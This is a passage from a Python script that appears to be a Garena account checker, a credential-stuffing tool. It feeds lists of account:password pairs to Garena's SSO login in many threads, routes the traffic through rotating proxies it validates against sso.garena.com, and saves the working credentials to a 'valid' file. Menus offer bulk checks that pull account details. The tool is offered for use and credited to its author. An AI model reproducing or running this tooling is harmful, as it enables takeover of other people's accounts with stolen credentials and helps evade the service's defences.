            console.print(Panel(
                f"[bright_cyan]{'█' * filled}{'░' * (bw - filled)}[/bright_cyan]  "
                f"[bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  "
                f"[dim]{dn}/{total}  ·  {rate:.1f}/s  ·  "
                f"ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
                border_style="bright_cyan",
                box=box.ROUNDED,
                padding=(0, 1),
                expand=False
            ))
            console.print()

    def _check(pair):
        if stopev.is_set():
            return
        account, password = pair
        result = 'error'
        note = ''
        try:
            session, dm = _sess()
            v1, v2, _ = preprobe(session, account, dm)
            if v1 == 'NO_ACCOUNT':
                result = 'invalid'
                note = 'Account Not Found'
            elif v1 == 'ERROR_AUTH':
                result = 'invalid'
                note = str(v2) if v2 else 'error_auth'
            elif not v1 or not v2:
                result = 'error'
                note = 'Prelogin Failed'
            else:
                sso = admit(session, account, password, v1, v2)
                if sso and not (
                    isinstance(sso, str)
                    and sso.startswith('permanent_fail:')
                ):
                    result = 'valid'
                    note = ''
                else:
                    result = 'invalid'
                    note = 'Incorrect Password'
        except Exception as e:
            result = 'error'
            note = type(e).__name__

        with flock:
            if result == 'valid':
                good_fh.write(f'{account}:{password}\n')
            elif result == 'invalid':
                bad_fh.write(f'{account}:{password}\n')
            else:
                err_fh.write(f'{account}:{password}  | {note}\n')

        with stlock:
            v[result] += 1
            v['done'] += 1
            dn = v['done']

        _line(result, account, password, note)
        if dn % 5 == 0 or dn == total:
            _stats_line()

    console.print(Panel(
        Text(f"Output: {outdir}", style="bright_cyan"),
        border_style="bright_cyan",
        box=box.ROUNDED,
        expand=False
    ))
    print()

    try:
        with ThreadPoolExecutor(max_workers=hands) as ex:
            futs = {ex.submit(_check, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stopev.is_set():
                    break
                try:
                    fut.result(timeout=30)
                except Exception:
                    pass
    except KeyboardInterrupt:
        stopev.set()
        herald('WARNING', 'Stopping — flushing results…')
    finally:
        good_fh.close()
        bad_fh.close()
        err_fh.close()

    elapsed = max(time.time() - started, 0.001)
    with stlock:
        vv = v['valid']
        iv = v['invalid']
        er = v['error']
        dn = v['done']

    def _bar(cnt, denom, color, bw=20):
        if denom == 0:
            return f"[dim]{'░' * bw}[/dim]"
        f2 = int(cnt / denom * bw)
        return (
            f"[{color}]{'█' * f2}[/{color}]"
            f"[dim]{'░' * (bw - f2)}[/dim]"
        )

    rtbl = Table(
        title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]",
        box=box.HEAVY,
        border_style="bright_yellow",
        show_header=True,
        header_style="bold dim",
        padding=(0, 2),
        expand=False
    )
    rtbl.add_column("Category", style="dim", no_wrap=True, width=14)
    rtbl.add_column("Count", justify="right", style="bright_white", width=10)
    rtbl.add_column("Pct", justify="right", style="bright_yellow", width=8)
    rtbl.add_column("Bar", no_wrap=True)

    for label_n, cnt, color in [
        ('✔  Valid', vv, "bright_green"),
        ('✖  Invalid', iv, "bright_red"),
        ('·  Errors', er, "dim")
    ]:
        pct_s = f'{cnt / total * 100:.1f}%' if total else '0.0%'
        rtbl.add_row(
            f"[{color}]{label_n}[/{color}]",
            f"[{color}]{cnt:,}[/{color}]",
            pct_s,
            _bar(cnt, total, color)
        )

    console.print(rtbl)
    print()

    statspanel = Panel(
        Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim")
        + Text(f"⚡  Rate     {dn / elapsed:.2f} acc/s\n", style="dim")
        + Text(f"◈  Processed {dn:,}/{total:,}\n", style="dim")
        + Text(f"✔  Valid    {good_path}\n", style="bright_cyan")
        + Text(f"✖  Invalid  {bad_path}\n", style="bright_cyan")
        + Text(f"·  Errors   {err_path}\n", style="bright_cyan")
        + Text("⬡  Powered by @rriellqt", style="bold bright_magenta"),
        border_style="bright_magenta",
        box=box.ROUNDED,
        expand=False
    )
    console.print(statspanel)
    print()
    input(f'  {dim}Press Enter to return to menu{rst} ')

def configure():
    global relay
    indent = "    "
    wipe()
    banner()

    def _head(title, sub=None):
        if sub:
            content = Text(title, style="bold bright_white") + Text(f"\n{sub}", style="dim")
        else:
            content = Text(title, style="bold bright_white")
        console.print(Panel(content, border_style="#ff8700", box=box.ROUNDED, expand=False))
        print()

    def _panel(content, border="#ff8700"):
        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
        print()

    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
    def _info(msg): console.print(indent + f"  [bold bright_cyan]{msg}[/bold bright_cyan]")

    def _ask(prompt, color="bold #ff8700"):
        return console.input(indent + f"[{color}]  ❯ {prompt}[/{color}]").strip()

    _head("PROXY CONFIGURATION", "Configure how requests are routed")

    mode_text = (
        Text("  [1]  ", style="bold #ff8700") + Text("Custom URL", style="bold white")
        + Text("   – Single proxy, enter manually\n", style="dim")
        + Text("  [2]  ", style="bold #ff8700") + Text("Proxy File", style="bold white")
        + Text("   – Load multiple proxies from a file\n", style="dim")
        + Text("  [3]  ", style="bold #ff8700") + Text("No Proxy  ", style="bold white")
        + Text("   – Direct connection, no routing", style="dim")
    )
    _panel(mode_text)

    while True:
        pick = _ask("Select mode (1-3): ")
        if pick in ("1", "2", "3"):
            break
        _err("Invalid choice. Enter 1, 2, or 3.")
    print()

    if pick == "1":
        url_in = _ask("Proxy URL (Enter to skip): ").strip()
        if not url_in:
            relay = Relay(enabled=False)
            _warn("No URL entered. Proxies disabled.")
        else:
            norm = interpret(url_in)
            if not norm:
                _err("Could not parse that format. Proxies disabled.")
                relay = Relay(enabled=False)
            else:
                do_val = _ask("Validate proxy? (Y/n): ").lower()
                if do_val in ("", "y", "yes"):
                    ok_, reason_, lat_ = grade(norm)
                    discard()
                    if ok_:
                        _ok(f"Proxy live.  IP: [cyan]{reason_}[/cyan]")
                        rank(1, 1, lat_, indent)
                        relay = Relay(enabled=True, fallback_url=norm)
                    else:
                        _err(f"Validation failed: [yellow]{reason_}[/yellow]")
                        force = _ask("Use anyway? (y/N): ", color="bold yellow").lower()
                        if force in ("y", "yes"):
                            relay = Relay(enabled=True, fallback_url=norm)
                            _warn("Proxy set (unvalidated).")
                        else:
                            relay = Relay(enabled=False)
                            _warn("Proxies disabled.")
                else:
                    relay = Relay(enabled=True, fallback_url=norm)
                    _ok("Custom proxy set (validation skipped).")

    elif pick == "2":
        file_in = _ask("File path (Enter for proxies.txt): ") or "proxies.txt"
        print()
        if not Path(file_in).is_file():
            _err(f"File not found: '{file_in}'. Proxies disabled.")
            relay = Relay(enabled=False)
        else:
            raw_lines = Path(file_in).read_text(encoding="utf-8", errors="ignore").splitlines()
            parsed = []
            for line in raw_lines:
                url = interpret(line)
                if url:
                    parsed.append(url)
            if not parsed:
                _warn("No valid proxies found. Proxies disabled.")
                relay = Relay(enabled=False)
            else:
                do_val = _ask("Validate all proxies? (Y/n): ").lower()
                if do_val in ("", "y", "yes"):
                    working = herd(parsed, edge=5.0, hands=500, lead=indent)
                    discard()
                    if not working:
                        _err("No proxies passed validation. Proxies disabled.")
                        relay = Relay(enabled=False)
                    else:
                        relay = Relay(enabled=True)
                        relay.proxies = working
                        _ok(f"Loaded {len(working)} validated proxies.")
                else:
                    relay = Relay(enabled=True)
                    relay.proxies = parsed
                    _ok(f"Loaded {len(parsed)} proxies (validation skipped).")

    else:
        relay = Relay(enabled=False)
        _warn("Proxies disabled. Running direct.")

    discard()
    print()

    if relay and relay.enabled and relay.proxies:
        console.print(indent + f"[dim]Probing first proxy against sso.garena.com…[/dim]")
        first = relay.proxies[0]
        ok_, reason_, lat_ = reach(first, edge=20.0)
        if ok_:
            console.print(indent + f"[bold green]  ✔ Proxy reachable[/bold green]  [dim]({lat_:.0f}ms)[/dim]")
        else:
            console.print(indent + f"[bold red]  ✖ Proxy cannot reach sso.garena.com:[/bold red] [yellow]{reason_}[/yellow]")
            force = input(indent + "  Continue anyway? (y/N): ").strip().lower()
            if force not in ('y', 'yes'):
                relay = Relay(enabled=False)
                console.print(indent + f"[bold yellow]  ⚠  Proxies disabled[/bold yellow]")

    print()
    input(indent + "Press Enter to continue...")

def diagnose():
    wipe()
    banner()
    console.print(Panel(
        Text("PROXY DIAGNOSTIC", style="bold bright_white")
        + Text("\nHTTP CONNECT + TLS probe to sso.garena.com:443", style="dim"),
        border_style="bright_magenta",
        box=box.ROUNDED,
        expand=False
    ))
    print()

    if not Path("proxies.txt").exists():
        herald('ERROR', "proxies.txt not found.")
        input(f'  {dim}Press Enter…{rst} ')
        return

    raw_lines = Path("proxies.txt").read_text(
        encoding="utf-8",
        errors="ignore"
    ).splitlines()
    proxies = []
    for line in raw_lines:
        p = interpret(line)
        if p:
            proxies.append(p)

    if not proxies:
        herald('ERROR', "No valid proxies found.")
        input(f'  {dim}Press Enter…{rst} ')
        return

    herald('INFO', f"Testing {len(proxies)} proxies…")
    print()

    results = []
    bolt = threading.Lock()

    def _run(p):
        ok_, reason_, lat_ = reach(p, edge=20.0)
        with bolt:
            results.append((p, ok_, reason_, lat_))

    try:
        with ThreadPoolExecutor(max_workers=min(30, len(proxies))) as ex:
            futs = [ex.submit(_run, p) for p in proxies]
            for f in as_completed(futs):
                try:
                    f.result(timeout=30)
                except Exception:
                    pass
    except KeyboardInterrupt:
        pass

    good_n = sum(1 for _, o, _, _ in results if o)
    bad_n = len(results) - good_n

    print()
    console.print(Panel(
        Text(f"✔  Reachable   {good_n:,}\n", style="bold bright_green")
        + Text(f"✖  Failed      {bad_n:,}\n", style="bold bright_red")
        + Text(f"◈  Total       {len(results):,}\n", style="dim"),
        title="[bold bright_yellow]DIAGNOSTIC COMPLETE[/bold bright_yellow]",
        border_style="bright_yellow",
        box=box.HEAVY,
        expand=False
    ))
    print()

    shown = 0
    for p, ok_, reason_, lat_ in results:
        if shown >= 10:
            break
        tag = (
            "[bright_green]✔[/bright_green]"
            if ok_
            else "[bright_red]✖[/bright_red]"
        )
        line = f"  {tag}  [dim]{p[:60]}[/dim]  [yellow]{reason_}[/yellow]"
        if lat_ > 0:
            line += f"  [cyan]{lat_:.0f}ms[/cyan]"
        console.print(line)
        shown += 1
    print()

    if good_n == 0:
        herald(
            'ERROR',
            "No proxies can reach sso.garena.com. Check your proxy service."
        )
        herald(
            'INFO',
            "Common causes: wrong auth, expired plan, wrong host/port, "
            "or service blocks Garena."
        )
    else:
        herald('SUCCESS', f"{good_n} proxies look usable for Garena auth.")
    print()
    input(f'  {dim}Press Enter to return to menu{rst} ')

def wipe():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    wipe()
    wid = measure(74)

    rows = [
        r" ██████╗ ██████╗ ██████╗ ███╗   ███╗",
        r"██╔════╝██╔═══██╗██╔══██╗████╗ ████║",
        r"██║     ██║   ██║██║  ██║██╔████╔██║",
        r"██║     ██║   ██║██║  ██║██║╚██╔╝██║",
        r"╚██████╗╚██████╔╝██████╔╝██║ ╚═╝ ██║",
        r" ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝",
    ]

    tones = [
        (150, 0, 255, 255, 120, 255),
        (135, 0, 255, 240, 100, 255),
        (120, 20, 255, 220, 80, 255),
        (105, 40, 255, 200, 60, 255),
        (90, 60, 255, 180, 40, 255),
        (70, 90, 255, 160, 20, 255),
    ]

    top_rule = shade('┏' + '━' * wid + '┓', 140, 0, 255, 220, 80, 255)
    mid_rule = shade('┣' + '━' * wid + '┫', 140, 0, 255, 220, 80, 255)
    bottom_rule = shade('┗' + '━' * wid + '┛', 140, 0, 255, 220, 80, 255)
    left_bar = shade('┃', 140, 0, 255, 140, 0, 255)
    right_bar = shade('┃', 220, 80, 255, 220, 80, 255)

    print(f"\n  {top_rule}")

    for i, line in enumerate(rows):
        r1, g1, b1, r2, g2, b2 = tones[i]
        gl = shade(line, r1, g1, b1, r2, g2, b2)
        vis = len(line)
        gap = max(wid - vis, 0)
        lp = gap // 2
        rp = gap - lp
        print(f"  {left_bar}{' ' * lp}{gl}{' ' * rp}{right_bar}")

    print(f"  {mid_rule}")

    tool = shade('rriellqt', 150, 0, 255, 255, 120, 255) + rst
    vstr = f"{ver}v1.0{rst}"
    author = f"{by}By{rst} {at}{brt}rriellqt{rst}"

    left = f"  {tool}  {vstr}"
    right = f"{author}  "

    def vlen(s):
        return len(re.sub(r"\033\[[0-9;]*m", "", s))

    total_visible = vlen(left) + vlen(right)
    gap = max(wid - total_visible, 1)
    print(f"  {left_bar}{left}{' ' * gap}{right}{right_bar}")
    print(f"  {bottom_rule}")
    print()

def menu():
    print()

    table = Table(
        show_header=False,
        box=box.HORIZONTALS,
        border_style="bright_magenta",
        padding=(0, 2)
    )
    table.add_column(style="bold white")
    table.add_column(style="white")
    table.add_row("1", "BULK FULL INFO   - Complete account details")
    table.add_row("2", "BULK SEMI INFO   - Valid, Level, Clean, Shell, Country")
    table.add_row("3", "BULK NO INFO     - Fastest, Valid / Invalid only")
    table.add_row("4", "SINGLE CHECK     - One account, full detail output")
    panel = Panel(
        table,
        title="[bold white]GARENA SELECTION[/bold white]",
        border_style="bright_magenta",
        box=box.DOUBLE_EDGE,
        padding=(0, 2),
        expand=False
    )
    rprint(Padding(panel, (0, 0, 0, 4)))
    print()

    while True:
        try:
            prompt_panel = Panel(
                "[white]Select Mode (1-4)[/white]",
                title="[bright_magenta]❯ Input[/bright_magenta]",
                border_style="bright_magenta",
                box=box.ROUNDED,
                expand=False
            )
            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
            pick = input("        ❯ ").strip()
            if pick in ('1', '2', '3', '4'):
                return pick
            herald('ERROR', 'Enter 1 - 4.', '    ')
        except KeyboardInterrupt:
            return '4'

def main():
    banner()
    time.sleep(0.8)

    while True:
        wipe()
        banner()
        pick = menu()
        if pick == '1':
            batch(style='full')
        elif pick == '2':
            batch(style='semi')
        elif pick == '3':
            batch(style='none')
        elif pick == '4':
            solo()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n  {yl}⚠  Script terminated by user.{rst}\n')
    except Exception as e:
        import traceback
        reason = str(e)
        print(f'\n  {rd}✖  Unexpected error: {reason}{rst}')
        traceback.print_exc()
        try:
            with open('error_log.txt', 'a', encoding='utf-8') as f:
                f.write(
                    f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]: '
                    f'{reason}\n'
                )
                f.write(traceback.format_exc())
                f.write('\n' + '-' * 60 + '\n')
        except Exception:
            pass